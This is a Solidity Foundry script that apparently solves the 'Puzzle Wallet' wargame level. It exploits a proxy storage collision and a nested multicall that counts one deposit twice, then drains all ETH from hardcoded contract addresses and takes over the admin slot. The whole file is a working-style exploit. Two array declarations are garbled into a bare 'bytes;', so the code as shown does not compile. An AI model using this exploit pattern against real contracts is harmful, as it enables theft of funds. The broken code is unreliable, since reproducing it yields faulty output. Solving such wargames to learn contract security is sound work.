// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";

contract AttackPuzzle is Script {

    PuzzleProxy proxy = PuzzleProxy(payable(0x0c49511429317D3B4E308Eab5185090c1Fe752BC));
    PuzzleWallet wallet = PuzzleWallet(payable(0x3BA2cC67ecaAF926DFe3B92250c6Ea85143AD568));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 🧩 1. Become owner via storage collision
        proxy.proposeNewAdmin(msg.sender);

        // 🧩 2. Add yourself to whitelist
        wallet.addToWhitelist(msg.sender);

        // 🧩 3. Prepare multicall exploit
        bytes;
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes;
        multicallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);

        // 🧩 4. Call multicall with ETH (double deposit trick)
        wallet.multicall{value: 0.001 ether}(multicallData);

        // 🧩 5. Drain all ETH
        wallet.execute(msg.sender, address(proxy).balance, "");

        // 🧩 6. Overwrite admin via storage collision
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}